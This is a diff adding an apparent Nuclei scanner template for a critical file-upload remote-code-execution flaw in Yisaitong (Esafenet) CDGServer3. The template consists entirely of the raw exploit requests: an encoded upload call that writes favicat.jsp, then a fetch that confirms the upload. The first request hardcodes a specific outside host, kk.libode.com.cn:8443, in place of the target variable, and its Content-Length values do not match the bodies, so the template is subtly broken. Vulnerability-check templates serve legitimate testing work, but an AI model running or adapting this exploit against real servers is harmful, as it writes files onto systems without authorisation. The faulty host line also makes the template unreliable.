@@ -1,0 +1,48 @@
+id: yisaitong-upload
+
+info:
+  name: 亿赛通文件上传
+  author: str1am
+  severity: critical
+  tags: yisaitong,rce
+
+
+requests:
+  - raw:
+      - |
+        POST /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCJIIPAFACIJKGABAFFDEDCAHOALGIGLKBFIFBFCGGBJFOGEGG HTTP/1.1
+        Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8
+        Content-Length: 38
+        Content-Type: application/xml;charset=UTF-8
+        Cookie: JSESSIONID=A00E152C6F1163D70C172BDCF32D9880
+        Cache-Control: no-cache
+        Pragma: no-cache
+        Host: kk.libode.com.cn:8443
+        Connection: close
+
+        Hello 6412121cbb2dc2cb9e460cfee7046be2
+
+      - |
+        GET /CDGServer3/favicat.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Accept-Encoding:gzip,deflate
+        Content-Length: 3
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "6412121cbb2dc2cb9e460cfee7046be2"
+        part: body
+
+      - type: status
+        status:
+          - 200
